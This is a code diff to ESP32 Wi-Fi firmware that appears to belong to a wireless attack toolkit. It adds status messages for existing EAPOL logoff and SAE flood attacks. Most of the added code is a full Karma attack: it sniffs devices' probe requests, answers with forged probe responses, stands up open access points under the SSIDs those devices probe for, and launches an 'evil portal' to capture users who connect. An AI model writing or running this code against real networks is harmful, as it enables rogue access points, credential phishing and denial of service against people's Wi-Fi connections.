@@ -4095,9 +4191,21 @@ esp_err_t wifi_manager_broadcast_ap(const char *ssid) {
         0x64, 0x00,                                     // Beacon interval (100 TU)
         0x11, 0x04,                                     // Capability info (ESS)
     };
+    // if a station on the AP has an IP, don't hop channels; send on current channel only
+    int start_channel = 1;
+    int end_channel = 11;
+    if (ap_sta_has_ip) {
+        uint8_t primary_channel;
+        wifi_second_chan_t second_channel;
+        esp_wifi_get_channel(&primary_channel, &second_channel);
+        start_channel = primary_channel;
+        end_channel = primary_channel;
+    }
 
-    for (int ch = 1; ch <= 11; ch++) {
-        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    for (int ch = start_channel; ch <= end_channel; ch++) {
+        if (!ap_sta_has_ip) {
+            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+        }
         generate_random_mac(&packet[10]);
         memcpy(&packet[16], &packet[10], 6);
 
@@ -4160,7 +4268,8 @@ esp_err_t wifi_manager_broadcast_ap(const char *ssid) {
             return err;
         }
 
-        vTaskDelay(pdMS_TO_TICKS(10)); // Delay between channel hops
+        vTaskDelay(pdMS_TO_TICKS(10));
+        if (ap_sta_has_ip) break; // only one transmit when a client has IP
     }
 
     return ESP_OK;
@@ -4190,12 +4299,13 @@ void wifi_manager_stop_beacon() {
 
         // Now restart services
         ap_manager_init();
+        status_display_show_status("Beacon Stopped");
     } else {
         printf("No beacon transmission running.\n");
         TERMINAL_VIEW_ADD_TEXT("No beacon transmission running.\n");
+        status_display_show_status("No Beacon Active");
     }
 }
-
 void wifi_manager_start_ip_lookup() {
     wifi_ap_record_t ap_info;
     if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK || ap_info.rssi == 0) {
@@ -4283,7 +4393,6 @@ void wifi_manager_start_ip_lookup() {
     printf("IP Scan Done.\n");
     TERMINAL_VIEW_ADD_TEXT("IP Scan Done...\n");
 }
-
 void wifi_manager_connect_wifi(const char *ssid, const char *password) {
     printf("Connecting to WiFi: %s\n", ssid);
     TERMINAL_VIEW_ADD_TEXT("Connecting to WiFi: %s\n", ssid);
@@ -4414,6 +4523,7 @@ void wifi_manager_start_beacon(const char *ssid) {
         ap_manager_stop_services();
         printf("Starting beacon transmission...\n");
         TERMINAL_VIEW_ADD_TEXT("Starting beacon transmission...\n");
+        status_display_show_status("Beacon Starting");
         configure_hidden_ap();
         esp_wifi_start();
         xTaskCreate(wifi_beacon_task, "beacon_task", 2048, (void *)ssid, 5, &beacon_task_handle);
@@ -4422,6 +4532,7 @@ void wifi_manager_start_beacon(const char *ssid) {
     } else {
         printf("Beacon transmission already running.\n");
         TERMINAL_VIEW_ADD_TEXT("Beacon transmission already running.\n");
+        status_display_show_status("Beacon Active");
     }
 }
 
@@ -4642,7 +4753,6 @@ void wifi_manager_start_station_scan() {
     printf("Started Station Scan (Channel Hopping Enabled)...\n");
     TERMINAL_VIEW_ADD_TEXT("Started Station Scan (Hopping)...\n");
 }
-
 // Print combined AP/Station scan results in ASCII chart
 void wifi_manager_scanall_chart() {
     if (ap_count == 0) {
@@ -4953,7 +5063,6 @@ static const uint8_t eapol_logoff_frame_template[36] = {
     // EAPOL header: version 1, type Logoff(2), length 0
     0x01, 0x02, 0x00, 0x00
 };
-
 static void eapol_logoff_task(void *param) {
     (void)param;
     uint8_t frame[sizeof(eapol_logoff_frame_template)];
@@ -5068,6 +5177,9 @@ void wifi_manager_start_eapollogoff_attack(void) {
     }
     eapol_logoff_running = true;
     eapol_logoff_packets_sent = 0;
+#ifdef CONFIG_WITH_STATUS_DISPLAY
+    status_display_show_attack("EAPOL logoff", "running");
+#endif
     xTaskCreate(eapol_logoff_task, "eapol_logoff", 2048, NULL, 5, &eapol_logoff_task_handle);
     xTaskCreate(eapol_logoff_display_task, "eapol_disp", 3072, NULL, 5, &eapol_logoff_display_task_handle);
 }
@@ -5101,6 +5213,9 @@ void wifi_manager_stop_eapollogoff_attack(void) {
     
     printf("EAPOL Logoff attack stopped\n");
     TERMINAL_VIEW_ADD_TEXT("EAPOL Logoff attack stopped\n");
+#ifdef CONFIG_WITH_STATUS_DISPLAY
+    status_display_show_status("EAPOL stopped");
+#endif
 }
 
 void wifi_manager_eapollogoff_display(void) {
@@ -5264,7 +5379,6 @@ static esp_err_t sae_derive_pwe(const char *password, const uint8_t *addr1,
     
     return found ? ESP_OK : ESP_FAIL;
 }
-
 /**
  * Generate SAE commit scalar and element
  */
@@ -5562,7 +5676,6 @@ static esp_err_t inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
     }
     return err;
 }
-
 static void sae_flood_task(void *param) {
     uint8_t spoofed_mac[6];
     uint8_t base_mac[6];
@@ -5827,6 +5940,9 @@ void wifi_manager_start_sae_flood(const char *password) {
            selected_ap.ssid, bssid_str, sae_target_channel);
     TERMINAL_VIEW_ADD_TEXT("SAE flood attack started against %s (%s) on channel %d\n", 
                           selected_ap.ssid, bssid_str, sae_target_channel);
+#ifdef CONFIG_WITH_STATUS_DISPLAY
+    status_display_show_attack("SAE flood", "running");
+#endif
 }
 
 void wifi_manager_stop_sae_flood(void) {
@@ -5869,6 +5985,9 @@ void wifi_manager_stop_sae_flood(void) {
     sae_mac_pool_ready = false;
     printf("SAE flood attack stopped. Total frames sent: %d\n", sae_flood_packets_sent);
     TERMINAL_VIEW_ADD_TEXT("SAE flood attack stopped. Total frames sent: %d\n", sae_flood_packets_sent);
+#ifdef CONFIG_WITH_STATUS_DISPLAY
+    status_display_show_status("SAE stopped");
+#endif
 }
 
 void wifi_manager_set_html_from_uart(void) {
@@ -5878,8 +5997,10 @@ void wifi_manager_set_html_from_uart(void) {
         if (html_buffer == NULL) {
             printf("Failed to allocate HTML buffer\n");
             use_html_buffer = false;
+            log_heap_status(TAG, "html_buffer_alloc_fail");
             return;
         }
+        log_heap_status(TAG, "html_buffer_alloc_ok");
     }
     html_buffer_size = 0;
     printf("HTML buffer mode enabled, ready to receive HTML content\n");
@@ -5929,9 +6050,6 @@ void wifi_manager_sae_flood_help(void) {
     glog("Usage: scanap -> list -a -> select -a <index> -> saeflood\n");
     glog("Commands: saeflood, stopsaeflood, saefloodhelp\n");
 }
-
-
-
 /**
  * SAE monitoring callback to handle commit/confirm responses and anti-clogging tokens
  */
@@ -6031,4 +6149,247 @@ static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
 /**
  * Inject SAE confirm frame after successful commit exchange
  */
-// confirm injection removed – flood commits only
+static bool karma_running = false;
+static TaskHandle_t karma_task_handle = NULL;
+
+// Add these globals near your other Karma variables
+static char karma_ssid_cache[KARMA_MAX_SSIDS][33];
+static int karma_ssid_count = 0;
+static int karma_ssid_index = 0;
+static uint32_t last_ssid_change_time = 0;
+static bool karma_ssid_manual_mode = false;
+
+
+// Helper to add SSID to cache if not present
+static void karma_add_ssid(const char *ssid) {
+    if (ssid == NULL || strlen(ssid) == 0) return;
+    // Check for duplicate
+    for (int i = 0; i < karma_ssid_count; ++i) {
+        if (strcmp(karma_ssid_cache[i], ssid) == 0) return;
+    }
+    // Add if space
+    if (karma_ssid_count < KARMA_MAX_SSIDS) {
+        strncpy(karma_ssid_cache[karma_ssid_count], ssid, 32);
+        karma_ssid_cache[karma_ssid_count][32] = '\0';
+        karma_ssid_count++;
+        printf("Karma cached SSID: %s\n", ssid);
+        TERMINAL_VIEW_ADD_TEXT("Karma cached SSID: %s\n", ssid);
+    }
+}
+
+void wifi_manager_set_karma_ssid_list(const char **ssids, int count) {
+    if (count > KARMA_MAX_SSIDS) count = KARMA_MAX_SSIDS;
+    karma_ssid_count = 0;
+    for (int i = 0; i < count; ++i) {
+        if (ssids[i] && strlen(ssids[i]) > 0 && strlen(ssids[i]) < 33) {
+            strncpy(karma_ssid_cache[karma_ssid_count], ssids[i], 32);
+            karma_ssid_cache[karma_ssid_count][32] = '\0';
+            karma_ssid_count++;
+        }
+    }
+    karma_ssid_index = 0;
+    karma_ssid_manual_mode = true;
+}
+
+// Helper function to send a probe response to a station
+static void karma_send_probe_response(const uint8_t *sta_mac, const char *ssid) {
+    uint8_t resp[128] = {0};
+    int idx = 0;
+    // Frame Control: Probe Response (0x50 0x00)
+    resp[idx++] = 0x50; resp[idx++] = 0x00;
+    // Duration
+    resp[idx++] = 0x00; resp[idx++] = 0x00;
+    // Destination: station MAC
+    memcpy(&resp[idx], sta_mac, 6); idx += 6;
+    // Source: our AP MAC
+    uint8_t ap_mac[6];
+    esp_wifi_get_mac(WIFI_IF_AP, ap_mac);
+    memcpy(&resp[idx], ap_mac, 6); idx += 6;
+    // BSSID: our AP MAC
+    memcpy(&resp[idx], ap_mac, 6); idx += 6;
+    // Seq-ctl
+    resp[idx++] = 0x00; resp[idx++] = 0x00;
+    // Timestamp (8 bytes)
+    memset(&resp[idx], 0, 8); idx += 8;
+    // Beacon interval
+    resp[idx++] = 0x64; resp[idx++] = 0x00;
+    // Capability info
+    resp[idx++] = 0x11; resp[idx++] = 0x04;
+    // SSID IE
+    resp[idx++] = 0x00; // Tag
+    resp[idx++] = strlen(ssid); // Length
+    memcpy(&resp[idx], ssid, strlen(ssid)); idx += strlen(ssid);
+    // Supported rates IE
+    resp[idx++] = 0x01; resp[idx++] = 0x08;
+    resp[idx++] = 0x82; resp[idx++] = 0x84; resp[idx++] = 0x8B; resp[idx++] = 0x96;
+    resp[idx++] = 0x24; resp[idx++] = 0x30; resp[idx++] = 0x48; resp[idx++] = 0x6C;
+    // DS Parameter Set IE (channel)
+    resp[idx++] = 0x03; resp[idx++] = 0x01;
+    uint8_t channel = 1;
+    wifi_second_chan_t second;
+    esp_wifi_get_channel(&channel, &second);
+    resp[idx++] = channel;
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, resp, idx, false);
+
+    // --- VERBOSE LOGGING FOR KARMA INTERACTIONS ---
+    if (err == ESP_OK) {
+        printf("[KARMA] Sent probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
+            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid);
+        TERMINAL_VIEW_ADD_TEXT("[KARMA] Sent probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
+            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid);
+    } else {
+        printf("[KARMA] Failed to send probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s': %s\n",
+            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid, esp_err_to_name(err));
+        TERMINAL_VIEW_ADD_TEXT("[KARMA] Failed to send probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s': %s\n",
+            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid, esp_err_to_name(err));
+    }
+}
+
+static void karma_probe_request_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT) return;
+    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
+    const wifi_ieee80211_hdr_t *hdr = &ipkt->hdr;
+    uint8_t subtype = (hdr->frame_ctrl & 0xF0) >> 4;
+    if (subtype != 4) return;
+    const uint8_t *payload = ipkt->payload;
+    int ssid_offset = 0;
+    while (ssid_offset < pkt->rx_ctrl.sig_len - 24) {
+        if (payload[ssid_offset] == 0x00) { // SSID IE
+            uint8_t ssid_len = payload[ssid_offset + 1];
+            if (ssid_len > 0 && ssid_len < 33) {
+                char probed_ssid[33] = {0};
+                memcpy(probed_ssid, &payload[ssid_offset + 2], ssid_len);
+                if (!karma_ssid_manual_mode) {
+                    karma_add_ssid(probed_ssid);
+                }
+                printf("[KARMA] Received probe request from STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
+                    hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], hdr->addr2[3], hdr->addr2[4], hdr->addr2[5], probed_ssid);
+                TERMINAL_VIEW_ADD_TEXT("[KARMA] Received probe request from STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
+                    hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], hdr->addr2[3], hdr->addr2[4], hdr->addr2[5], probed_ssid);
+                // Respond directly to probe request
+                karma_send_probe_response(hdr->addr2, probed_ssid);
+            }
+            break;
+        }
+        ssid_offset += payload[ssid_offset + 1] + 2;
+    }
+}
+
+static void karma_start_portal_for_ssid(const char *ssid) {
+    // Use the default portal, SSID as AP name, open AP (no password)
+    if (!karma_portal_active) {
+        wifi_manager_start_evil_portal("default", ssid, "", ssid, "portal.local");
+        karma_portal_active = true;
+        printf("[KARMA] Evil portal started for SSID: %s\n", ssid);
+        TERMINAL_VIEW_ADD_TEXT("[KARMA] Evil portal started for SSID: %s\n", ssid);
+    }
+}
+
+static void karma_stop_portal_if_active(void) {
+    if (karma_portal_active) {
+        wifi_manager_stop_evil_portal();
+        karma_portal_active = false;
+        printf("[KARMA] Evil portal stopped\n");
+        TERMINAL_VIEW_ADD_TEXT("[KARMA] Evil portal stopped\n");
+    }
+}
+
+static void karma_task(void *param) {
+    printf("Karma attack started\n");
+    TERMINAL_VIEW_ADD_TEXT("Karma attack started\n");
+    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(karma_probe_request_callback);
+
+    last_ssid_change_time = esp_timer_get_time() / 1000;
+
+    // If only one SSID, set it once and don't rotate
+    if (karma_ssid_count == 1) {
+        wifi_config_t ap_config = {
+            .ap = {
+                .ssid = "",
+                .ssid_len = strlen(karma_ssid_cache[0]),
+                .channel = 1,
+                .authmode = WIFI_AUTH_OPEN,
+                .max_connection = 4,
+                .ssid_hidden = 0
+            }
+        };
+        strncpy((char *)ap_config.ap.ssid, karma_ssid_cache[0], 32);
+        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+        ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
+        ESP_ERROR_CHECK(esp_wifi_start());
+        printf("Karma using single SSID: %s\n", karma_ssid_cache[0]);
+        TERMINAL_VIEW_ADD_TEXT("Karma using single SSID: %s\n", karma_ssid_cache[0]);
+        karma_start_portal_for_ssid(karma_ssid_cache[0]);
+    }
+
+    while (karma_running) {
+        uint32_t now = esp_timer_get_time() / 1000;
+        // Only rotate if more than one SSID
+        if (!ap_sta_has_ip && karma_ssid_count > 1 && (now - last_ssid_change_time > 5000)) {
+            wifi_config_t ap_config = {
+                .ap = {
+                    .ssid = "",
+                    .ssid_len = strlen(karma_ssid_cache[karma_ssid_index]),
+                    .channel = 1,
+                    .authmode = WIFI_AUTH_OPEN,
+                    .max_connection = 4,
+                    .ssid_hidden = 0
+                }
+            };
+            strncpy((char *)ap_config.ap.ssid, karma_ssid_cache[karma_ssid_index], 32);
+            ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
+            printf("Karma rotating to SSID: %s\n", karma_ssid_cache[karma_ssid_index]);
+            TERMINAL_VIEW_ADD_TEXT("Karma rotating to SSID: %s\n", karma_ssid_cache[karma_ssid_index]);
+            karma_start_portal_for_ssid(karma_ssid_cache[karma_ssid_index]);
+            karma_ssid_index = (karma_ssid_index + 1) % karma_ssid_count;
+            last_ssid_change_time = now;
+        }
+    
+        // Send beacon frames for all cached SSIDs (every 500ms)
+        if (!ap_sta_has_ip) {
+            for (int i = 0; i < karma_ssid_count; ++i) {
+                wifi_manager_broadcast_ap(karma_ssid_cache[i]);
+                vTaskDelay(pdMS_TO_TICKS(10)); // Small delay between beacons
+            }
+        }
+    
+        vTaskDelay(pdMS_TO_TICKS(500));
+    }
+    esp_wifi_set_promiscuous(false);
+    karma_stop_portal_if_active();
+    karma_task_handle = NULL;
+    printf("Karma attack stopped\n");
+    TERMINAL_VIEW_ADD_TEXT("Karma attack stopped\n");
+    vTaskDelete(NULL);
+}
+void wifi_manager_start_karma(void) {
+    if (karma_running) {
+        printf("Karma attack already running\n");
+        TERMINAL_VIEW_ADD_TEXT("Karma attack already running\n");
+        return;
+    }
+    karma_running = true;
+    if (!karma_ssid_manual_mode) {
+        karma_ssid_count = 0;
+        karma_ssid_index = 0;
+    }
+    xTaskCreate(karma_task, "karma_task", 4096, NULL, 5, &karma_task_handle);
+}
+
+void wifi_manager_stop_karma(void) {
+    if (!karma_running) {
+        printf("Karma attack not running\n");
+        TERMINAL_VIEW_ADD_TEXT("Karma attack not running\n");
+        return;
+    }
+    karma_running = false;
+    karma_ssid_count = 0;
+    karma_ssid_index = 0;
+    karma_ssid_manual_mode = false;
+    // Task will clean up itself
+}
